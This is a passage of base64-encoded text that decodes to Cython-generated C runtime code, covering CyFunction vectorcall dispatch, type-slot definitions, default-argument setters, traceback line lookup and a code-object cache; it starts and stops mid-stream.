AqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKVxue1xuICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYyA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopZnVuYztcbiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTFxuICAgIFB5X3NzaXplX3QgbmFyZ3MgPSAoUHlfc3NpemVfdCluYXJnc2Y7XG4jZWxzZVxuICAgIFB5X3NzaXplX3QgbmFyZ3MgPSBQeVZlY3RvcmNhbGxfTkFSR1MobmFyZ3NmKTtcbiNlbmRpZlxuICAgIFB5T2JqZWN0ICpzZWxmO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeUNGdW5jdGlvbiBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oY3lmdW5jLT5mdW5jKTtcbiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgUHlDRnVuY3Rpb24gbWV0aCA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fbWwtPm1sX21ldGg7XG4jZW5kaWZcbiAgICBzd2l0Y2ggKF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9DaGVja0FyZ3MoY3lmdW5jLCBuYXJncywga3duYW1lcykpIHtcbiAgICBjYXNlIDE6XG4gICAgICAgIHNlbGYgPSBhcmdzWzBdO1xuICAgICAgICBhcmdzICs9IDE7XG4gICAgICAgIG5hcmdzIC09IDE7XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgMDpcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+ZnVuYyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgICAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9zZWxmO1xuI2VuZGlmXG4gICAgICAgIGJyZWFrO1xuICAgIGRlZmF1bHQ6XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkobmFyZ3MgIT0gMSkpIHtcbiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV9hcmd1bWVudF9jb3VudF9lcnJvcihcbiAgICAgICAgICAgIGN5ZnVuYywgInRha2VzIGV4YWN0bHkgb25lIGFyZ3VtZW50IiwgbmFyZ3MpO1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgcmV0dXJuIG1ldGgoc2VsZiwgYXJnc1swXSk7XG59XG5zdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfRkFTVENBTExfS0VZV09SRFMoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpXG57XG4gICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqY3lmdW5jID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKilmdW5jO1xuI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMXG4gICAgUHlfc3NpemVfdCBuYXJncyA9IChQeV9zc2l6ZV90KW5hcmdzZjtcbiNlbHNlXG4gICAgUHlfc3NpemVfdCBuYXJncyA9IFB5VmVjdG9yY2FsbF9OQVJHUyhuYXJnc2YpO1xuI2VuZGlmXG4gICAgUHlPYmplY3QgKnNlbGY7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihjeWZ1bmMtPmZ1bmMpO1xuICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICBQeUNGdW5jdGlvbiBtZXRoID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9tbC0+bWxfbWV0aDtcbiNlbmRpZlxuICAgIHN3aXRjaCAoX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhjeWZ1bmMsIG5hcmdzLCBOVUxMKSkge1xuICAgIGNhc2UgMTpcbiAgICAgICAgc2VsZiA9IGFyZ3NbMF07XG4gICAgICAgIGFyZ3MgKz0gMTtcbiAgICAgICAgbmFyZ3MgLT0gMTtcbiAgICAgICAgYnJlYWs7XG4gICAgY2FzZSAwOlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dldFNlbGYoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5mdW5jKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgICAgIHNlbGYgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX3NlbGY7XG4jZW5kaWZcbiAgICAgICAgYnJlYWs7XG4gICAgZGVmYXVsdDpcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIHJldHVybiAoKF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3Jkcykodm9pZCgqKSh2b2lkKSltZXRoKShzZWxmLCBhcmdzLCBuYXJncywga3duYW1lcyk7XG59XG5zdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfRkFTVENBTExfS0VZV09SRFNfTUVUSE9EKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKVxue1xuICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYyA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopZnVuYztcbiAgICBQeVR5cGVPYmplY3QgKmNscyA9IChQeVR5cGVPYmplY3QgKikgX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihjeWZ1bmMpO1xuI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMXG4gICAgUHlfc3NpemVfdCBuYXJncyA9IChQeV9zc2l6ZV90KW5hcmdzZjtcbiNlbHNlXG4gICAgUHlfc3NpemVfdCBuYXJncyA9IFB5VmVjdG9yY2FsbF9OQVJHUyhuYXJnc2YpO1xuI2VuZGlmXG4gICAgUHlPYmplY3QgKnNlbGY7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihjeWZ1bmMtPmZ1bmMpO1xuICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICBQeUNGdW5jdGlvbiBtZXRoID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9tbC0+bWxfbWV0aDtcbiNlbmRpZlxuICAgIHN3aXRjaCAoX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhjeWZ1bmMsIG5hcmdzLCBOVUxMKSkge1xuICAgIGNhc2UgMTpcbiAgICAgICAgc2VsZiA9IGFyZ3NbMF07XG4gICAgICAgIGFyZ3MgKz0gMTtcbiAgICAgICAgbmFyZ3MgLT0gMTtcbiAgICAgICAgYnJlYWs7XG4gICAgY2FzZSAwOlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dldFNlbGYoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5mdW5jKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgICAgIHNlbGYgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX3NlbGY7XG4jZW5kaWZcbiAgICAgICAgYnJlYWs7XG4gICAgZGVmYXVsdDpcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIHJldHVybiAoKF9fUHl4X1B5Q01ldGhvZCkodm9pZCgqKSh2b2lkKSltZXRoKShzZWxmLCBjbHMsIGFyZ3MsIChzaXplX3QpbmFyZ3MsIGt3bmFtZXMpO1xufVxuI2VuZGlmXG5zdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfQ3lGdW5jdGlvblR5cGVfc2xvdHNbXSA9IHtcbiAgICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX2RlYWxsb2N9LFxuICAgIHtQeV90cF9yZXByLCAodm9pZCAqKV9fUHl4X0N5RnVuY3Rpb25fcmVwcn0sXG4gICAge1B5X3RwX2NhbGwsICh2b2lkICopX19QeXhfQ3lGdW5jdGlvbl9DYWxsQXNNZXRob2R9LFxuICAgIHtQeV90cF90cmF2ZXJzZSwgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX3RyYXZlcnNlfSxcbiAgICB7UHlfdHBfY2xlYXIsICh2b2lkICopX19QeXhfQ3lGdW5jdGlvbl9jbGVhcn0sXG4gICAge1B5X3RwX21ldGhvZHMsICh2b2lkICopX19weXhfQ3lGdW5jdGlvbl9tZXRob2RzfSxcbiAgICB7UHlfdHBfbWVtYmVycywgKHZvaWQgKilfX3B5eF9DeUZ1bmN0aW9uX21lbWJlcnN9LFxuICAgIHtQeV90cF9nZXRzZXQsICh2b2lkICopX19weXhfQ3lGdW5jdGlvbl9nZXRzZXRzfSxcbiAgICB7UHlfdHBfZGVzY3JfZ2V0LCAodm9pZCAqKV9fUHl4X1B5TWV0aG9kX05ld30sXG4gICAgezAsIDB9LFxufTtcbnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF9DeUZ1bmN0aW9uVHlwZV9zcGVjID0ge1xuICAgIF9fUFlYX1RZUEVfTU9EVUxFX1BSRUZJWCAiY3l0aG9uX2Z1bmN0aW9uX29yX21ldGhvZCIsXG4gICAgc2l6ZW9mKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QpLFxuICAgIDAsXG4jaWZkZWYgUHlfVFBGTEFHU19NRVRIT0RfREVTQ1JJUFRPUlxuICAgIFB5X1RQRkxBR1NfTUVUSE9EX0RFU0NSSVBUT1IgfFxuI2VuZGlmXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiNpZiBkZWZpbmVkKFB5X1RQRkxBR1NfSEFWRV9WRUNUT1JDQUxMKVxuICAgIFB5X1RQRkxBR1NfSEFWRV9WRUNUT1JDQUxMIHxcbiNlbGlmIGRlZmluZWQoX1B5X1RQRkxBR1NfSEFWRV9WRUNUT1JDQUxMKVxuICAgIF9QeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTCB8XG4jZW5kaWZcbiNlbmRpZiAvLyBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDBcbiAgICBQeV9UUEZMQUdTX0lNTVVUQUJMRVRZUEUgfFxuI2VuZGlmXG4gICAgUHlfVFBGTEFHU19ERUZBVUxUIHwgUHlfVFBGTEFHU19IQVZFX0dDIHwgUHlfVFBGTEFHU19CQVNFVFlQRSxcbiAgICBfX3B5eF9DeUZ1bmN0aW9uVHlwZV9zbG90c1xufTtcbnN0YXRpYyBpbnQgX19weXhfQ3lGdW5jdGlvbl9pbml0KFB5T2JqZWN0ICptb2R1bGUpIHtcbiAgICBfX3B5eF9tc3RhdGV0eXBlICptc3RhdGUgPSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShtb2R1bGUpO1xuICAgIG1zdGF0ZS0+X19weXhfQ3lGdW5jdGlvblR5cGUgPSBfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYyhcbiAgICAgICAgbXN0YXRlLT5fX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc1R5cGUsIG1vZHVsZSwgJl9fcHl4X0N5RnVuY3Rpb25UeXBlX3NwZWMsIE5VTEwpO1xuICAgIGlmICh1bmxpa2VseShtc3RhdGUtPl9fcHl4X0N5RnVuY3Rpb25UeXBlID09IE5VTEwpKSB7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9Jbml0RGVmYXVsdHMoUHlPYmplY3QgKmZ1bmMsIFB5VHlwZU9iamVjdCAqZGVmYXVsdHNfdHlwZSkge1xuICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0gPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jO1xuICAgIG0tPmRlZmF1bHRzID0gUHlPYmplY3RfQ2FsbE9iamVjdCgoUHlPYmplY3QqKWRlZmF1bHRzX3R5cGUsIE5VTEwpOyAvLyBfUHlPYmplY3RfTmV3KGRlZmF1bHRzX3R5cGUpO1xuICAgIGlmICh1bmxpa2VseSghbS0+ZGVmYXVsdHMpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICByZXR1cm4gbS0+ZGVmYXVsdHM7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNUdXBsZShQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKnR1cGxlKSB7XG4gICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqbSA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIGZ1bmM7XG4gICAgbS0+ZGVmYXVsdHNfdHVwbGUgPSB0dXBsZTtcbiAgICBQeV9JTkNSRUYodHVwbGUpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzS3dEaWN0KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqZGljdCkge1xuICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0gPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jO1xuICAgIG0tPmRlZmF1bHRzX2t3ZGljdCA9IGRpY3Q7XG4gICAgUHlfSU5DUkVGKGRpY3QpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldEFubm90YXRpb25zRGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmRpY3QpIHtcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgZnVuYztcbiAgICBtLT5mdW5jX2Fubm90YXRpb25zID0gZGljdDtcbiAgICBQeV9JTkNSRUYoZGljdCk7XG59XG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX05ldyhQeU1ldGhvZERlZiAqbWwsIGludCBmbGFncywgUHlPYmplY3QqIHF1YWxuYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSwgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QqIGdsb2JhbHMsIFB5T2JqZWN0KiBjb2RlKSB7XG4gICAgUHlPYmplY3QgKm9wID0gX19QeXhfQ3lGdW5jdGlvbl9Jbml0KFxuICAgICAgICBQeU9iamVjdF9HQ19OZXcoX19weXhfQ3lGdW5jdGlvbk9iamVjdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfQ3lGdW5jdGlvblR5cGUpLFxuICAgICAgICBtbCwgZmxhZ3MsIHF1YWxuYW1lLCBjbG9zdXJlLCBtb2R1bGUsIGdsb2JhbHMsIGNvZGVcbiAgICApO1xuICAgIGlmIChsaWtlbHkob3ApKSB7XG4gICAgICAgIFB5T2JqZWN0X0dDX1RyYWNrKG9wKTtcbiAgICB9XG4gICAgcmV0dXJuIG9wO1xufVxuXG5cbiNpZiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLICYmIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tfUlVOVElNRVxuc3RhdGljIGludCBfX1B5eF9DTGluZUZvclRyYWNlYmFjayhQeVRocmVhZFN0YXRlICp0c3RhdGUsIGludCBjX2xpbmUpIHtcbiAgICBQeU9iamVjdCAqdXNlX2NsaW5lO1xuICAgIFB5T2JqZWN0ICpwdHlwZSwgKnB2YWx1ZSwgKnB0cmFjZWJhY2s7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgUHlPYmplY3QgKipjeXRob25fcnVudGltZV9kaWN0O1xuI2VuZGlmXG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIodHN0YXRlKTtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2N5dGhvbl9ydW50aW1lKSkge1xuICAgICAgICByZXR1cm4gY19saW5lO1xuICAgIH1cbiAgICBfX1B5eF9FcnJGZXRjaEluU3RhdGUodHN0YXRlLCAmcHR5cGUsICZwdmFsdWUsICZwdHJhY2ViYWNrKTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICBjeXRob25fcnVudGltZV9kaWN0ID0gX1B5T2JqZWN0X0dldERpY3RQdHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY3l0aG9uX3J1bnRpbWUpO1xuICAgIGlmIChsaWtlbHkoY3l0aG9uX3J1bnRpbWVfZGljdCkpIHtcbiAgICAgICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTigqY3l0aG9uX3J1bnRpbWVfZGljdCk7XG4gICAgICAgIF9fUFlYX1BZX0RJQ1RfTE9PS1VQX0lGX01PRElGSUVEKFxuICAgICAgICAgICAgdXNlX2NsaW5lLCAqY3l0aG9uX3J1bnRpbWVfZGljdCxcbiAgICAgICAgICAgIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyKCpjeXRob25fcnVudGltZV9kaWN0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xpbmVfaW5fdHJhY2ViYWNrKSlcbiAgICAgICAgUHlfWElOQ1JFRih1c2VfY2xpbmUpO1xuICAgICAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIH0gZWxzZVxuI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKnVzZV9jbGluZV9vYmogPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jeXRob25fcnVudGltZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsaW5lX2luX3RyYWNlYmFjayk7XG4gICAgICBpZiAodXNlX2NsaW5lX29iaikge1xuICAgICAgICB1c2VfY2xpbmUgPSBQeU9iamVjdF9Ob3QodXNlX2NsaW5lX29iaikgPyBQeV9GYWxzZSA6IFB5X1RydWU7XG4gICAgICAgIFB5X0lOQ1JFRih1c2VfY2xpbmUpO1xuICAgICAgICBQeV9ERUNSRUYodXNlX2NsaW5lX29iaik7XG4gICAgICB9IGVsc2Uge1xuICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgICB1c2VfY2xpbmUgPSBOVUxMO1xuICAgICAgfVxuICAgIH1cbiAgICBpZiAoIXVzZV9jbGluZSkge1xuICAgICAgICBjX2xpbmUgPSAwO1xuICAgICAgICAodm9pZCkgUHlPYmplY3RfU2V0QXR0cihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jeXRob25fcnVudGltZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsaW5lX2luX3RyYWNlYmFjaywgUHlfRmFsc2UpO1xuICAgIH1cbiAgICBlbHNlIGlmICh1c2VfY2xpbmUgPT0gUHlfRmFsc2UgfHwgKHVzZV9jbGluZSAhPSBQeV9UcnVlICYmIFB5T2JqZWN0X05vdCh1c2VfY2xpbmUpICE9IDApKSB7XG4gICAgICAgIGNfbGluZSA9IDA7XG4gICAgfVxuICAgIFB5X1hERUNSRUYodXNlX2NsaW5lKTtcbiAgICBfX1B5eF9FcnJSZXN0b3JlSW5TdGF0ZSh0c3RhdGUsIHB0eXBlLCBwdmFsdWUsIHB0cmFjZWJhY2spO1xuICAgIHJldHVybiBjX2xpbmU7XG59XG4jZW5kaWZcblxuXG5zdGF0aWMgaW50IF9fcHl4X2Jpc2VjdF9jb2RlX29iamVjdHMoX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkqIGVudHJpZXMsIGludCBjb3VudCwgaW50IGNvZGVfbGluZSkge1xuICAgIGludCBzdGFydCA9IDAsIG1pZCA9IDAsIGVuZCA9IGNvdW50IC0gMTtcbiAgICBpZiAoZW5kID49IDAgJiYgY29kZV9saW5lID4gZW50cmllc1tlbmRdLmNvZGVfbGluZSkge1xuICAgICAgICByZXR1cm4gY291bnQ7XG4gICAgfVxuICAgIHdoaWxlIChzdGFydCA8IGVuZCkge1xuICAgICAgICBtaWQgPSBzdGFydCArIChlbmQgLSBzdGFydCkgLyAyO1xuICAgICAgICBpZiAoY29kZV9saW5lIDwgZW50cmllc1ttaWRdLmNvZGVfbGluZSkge1xuICAgICAgICAgICAgZW5kID0gbWlkO1xuICAgICAgICB9IGVsc2UgaWYgKGNvZGVfbGluZSA+IGVudHJpZXNbbWlkXS5jb2RlX2xpbmUpIHtcbiAgICAgICAgICAgICBzdGFydCA9IG1pZCArIDE7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXR1cm4gbWlkO1xuICAgICAgICB9XG4gICAgfVxuICAgIGlmIChjb2RlX2xpbmUgPD0gZW50cmllc1ttaWRdLmNvZGVfbGluZSkge1xuICAgICAgICByZXR1cm4gbWlkO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHJldHVybiBtaWQgKyAxO1xuICAgIH1cbn1cbnN0YXRpYyBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSAqX19weXhfX2ZpbmRfY29kZV9vYmplY3Qoc3RydWN0IF9fUHl4X0NvZGVPYmplY3RDYWNoZSAqY29kZV9jYWNoZSwgaW50IGNvZGVfbGluZSkge1xuICAgIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdDtcbiAgICBpbnQgcG9zO1xuICAgIGlmICh1bmxpa2VseSghY29kZV9saW5lKSB8fCB1bmxpa2VseSghY29kZV9jYWNoZS0+ZW50cmllcykpIHtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIHBvcyA9IF9fcHl4X2Jpc2VjdF9jb2RlX29iamVjdHMoY29kZV9jYWNoZS0+ZW50cmllcywgY29kZV9jYWNoZS0+Y291bnQsIGNvZGVfbGluZSk7XG4gICAgaWYgKHVubGlrZWx5KHBvcyA+PSBjb2RlX2NhY2hlLT5jb3VudCkgfHwgdW5saWtlbHkoY29kZV9jYWNoZS0+ZW50cmllc1twb3NdLmNvZGVfbGluZSAhPSBjb2RlX2xpbmUpKSB7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBjb2RlX29iamVjdCA9IGNvZGVfY2FjaGUtPmVudHJpZXNbcG9zXS5jb2RlX29iamVjdDtcbiAgICBQeV9JTkNSRUYoY29kZV9vYmplY3QpO1xuICAgIHJldHVybiBjb2RlX29iamVjdDtcbn1cbnN0YXRpYyBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSAqX19weXhfZmluZF9jb2RlX29iamVjdChpbnQgY29kZV9saW5lKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgJiYgIUNZVEhPTl9BVE9NSUNTXG4gICAgKHZvaWQpX19weXhfX2ZpbmRfY29kZV9vYmplY3Q7XG4gICAgcmV0dXJuIE5VTEw7IC8vIE1vc3QgaW1wbGVtZW50YXRpb24gc2hvdWxkIGhhdmUgYXRvbWljcy4gQnV0IG90aGVyd2lzZSwgZG9uXCd0IG1ha2UgaXQgdGhyZWFkLXNhZmUsIGp1c3QgbWlzcy5cbiNlbHNlXG4gICAgc3RydWN0IF9fUHl4X0NvZGVPYmplY3RDYWNoZSAqY29kZV9jYWNoZSA9ICZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2RlX2NhY2hlO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIG9sZF9jb3VudCA9IF9fcHl4X2F0b21pY19pbmNyX2FjcV9yZWwoJmNvZGVfY2FjaGUtPmFjY2Vzc29yX2NvdW50KTtcbiAgICBpZiAob2xkX2NvdW50IDwgMCkge1xuICAgICAgICBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKCZjb2RlX2NhY2hlLT5hY2Nlc3Nvcl9jb3VudCk7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiNlbmRpZlxuICAgIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlICpyZXN1bHQgPSBfX3B5eF9fZmluZF9jb2RlX29iamVjdChjb2RlX2NhY2hlLCBjb2RlX2xpbmUpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCgmY29kZV9jYWNoZS0+YWNjZXNzb3JfY291bnQpO1xuI2VuZGlmXG4gICAgcmV0dXJuIHJlc3VsdDtcbiNlbmRpZlxufVxuc3RhdGljIHZvaWQgX19weXhfX2luc2VydF9jb2RlX29iamVjdChzdHJ1Y3QgX19QeXhfQ29kZU9iamVjdENhY2hlICpjb2RlX2NhY2hlLCBpbnQgY29kZV9saW5lLCBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSogY29kZV9vYmplY3QpXG57XG4gICAgaW50IHBvcywgaTtcbiAgICBfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSogZW50cmllcyA9IGNvZGVfY2FjaGUtPmVudHJpZXM7XG4gICAgaWYgKHVubGlrZWx5KCFjb2RlX2xpbmUpKSB7XG4gICAgICAgIHJldHVybjtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KCFlbnRyaWVzKSkge1xuICAgICAgICBlbnRyaWVzID0gKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KilQeU1lbV9NYWxsb2MoNjQqc2l6ZW9mKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KSk7XG4gICAgICAgIGlmIChsaWtlbHkoZW50cmllcykpIHtcbiAgICAgICAgICAgIGNvZGVfY2FjaGUtPmVudHJpZXMgPSBlbnRyaWVzO1xuICAgICAgICAgICAgY29kZV9jYWNoZS0+bWF4X2NvdW50ID0gNjQ7XG4gICAgICAgICAgICBjb2RlX2NhY2hlLT5jb3VudCA9IDE7XG4gICAgICAgICAgICBlbnRyaWVzWzBdLmNvZGVfbGluZSA9IGNvZGVfbGluZTtcbiAgICAgICAgICAgIGVudHJpZXNbMF0uY29kZV9vYmplY3QgPSBjb2RlX29iamVjdDtcbiAgICAgICAgICAgIFB5X0lOQ1JFRihjb2RlX29iamVjdCk7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBwb3MgPSBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKGNvZGVfY2FjaGUtPmVudHJpZXMsIGNvZGVfY2FjaGUtPmNvdW50LCBjb2RlX2xpbmUpO1xuICAgIGlmICgocG9zIDwgY29kZV9jYWNoZS0+Y291bnQpICYmIHVubGlrZWx5KGNvZGVfY2FjaGUtPmVudHJpZXNbcG9zXS5jb2RlX2xpbmUgPT0gY29kZV9saW5lKSkge1xuICAgICAgICBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSogdG1wID0gZW50cmllc1twb3NdLmNvZGVfb2JqZWN0O1xuICAgICAgICBlbnRyaWVzW3Bvc10uY29kZV9vYmplY3QgPSBjb2RlX29iamVjdDtcbiAgICAgICAgUHlfSU5DUkVGKGNvZGVfb2JqZWN0KTtcbiAgICAgICAgUHlfREVDUkVGKHRtcCk7XG4gICAgICAgIHJldHVybjtcbiAgICB9XG4gICAgaWYgKGNvZGVfY2FjaGUtPmNvdW50ID09IGNvZGVfY2FjaGUtPm1heF9jb3VudCkge1xuICAgI